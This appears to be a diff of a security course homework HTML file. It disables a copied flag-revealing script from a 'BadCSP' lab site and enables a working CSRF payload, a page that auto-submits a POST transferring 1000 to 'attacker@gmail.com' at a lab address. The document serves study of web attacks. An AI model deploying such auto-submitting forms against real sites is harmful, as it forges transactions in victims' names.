@@ -1,6 +1,6 @@
 <!-- HW1Q3 ------------------------------------------------------------------------>
 <!-- script in lines 3-18 taken from app.js of the original BadCSP website -->
-<script>
+<!-- <script>
     f = [36, 33, 45, 39, 45, 110, 116, 121, 121, 74, 108, 37, 96, 103, 
     74, 119, 84, 102, 38, 74, 96, 103, 124, 74, 116, 103, 38, 74, 119, 
     112, 89, 37, 123, 114, 74, 97, 37, 74, 96, 32, 104]
@@ -16,24 +16,29 @@
         document.getElementById('flag').innerText = p;
         o(a);
     }
-</script>
+</script> -->
 
 <!-- displays the flag when the page loads -->
-<!-- reference for onload on line 23: https://www.w3schools.com/jsref/event_onload.asp -->
-<body onload="window.alert()">
+<!-- reference for onload in line 23: [26] https://www.w3schools.com/jsref/event_onload.asp -->
+<!-- reference for displaying the flag in line 25: taken from the html response from the original BadCSP website -->
+<!-- <body onload="window.alert()">
     <h1 id="flag" style="text-align:center;"></h1>
-</body>
+</body> -->
 
 <!-- HW1Q4 ------------------------------------------------------------------------>
+<!-- references for onload in line 33: [26] https://www.w3schools.com/jsref/event_onload.asp -->
 <!-- reference on creating a CSRF attack via POST: 
-    https://owasp.org/www-community/attacks/csrf 
-    https://learn.snyk.io/lessons/csrf-attack/javascript/ -->
-<!-- <body onload="document.forms[0].submit()">
+    https://learn.snyk.io/lessons/csrf-attack/javascript/ [28]
+    https://owasp.org/www-community/attacks/csrf [29] -->
+<!-- reference for html forms and input: 
+    https://www.w3schools.com/tags/tag_input.asp [30]
+    https://www.w3schools.com/tags/tag_form.asp [31] -->
+<body onload="document.forms[0].submit()">
 
     <form action="http://192.168.2.98:49698/transfer" method="POST">
         <input type="text" name="user_to" value="attacker@gmail.com"/>
         <input type="text" name="amount" value="1000"/>
         <input type="submit" value="transfer"/>
     </form>
-</body> -->
+</body>
 
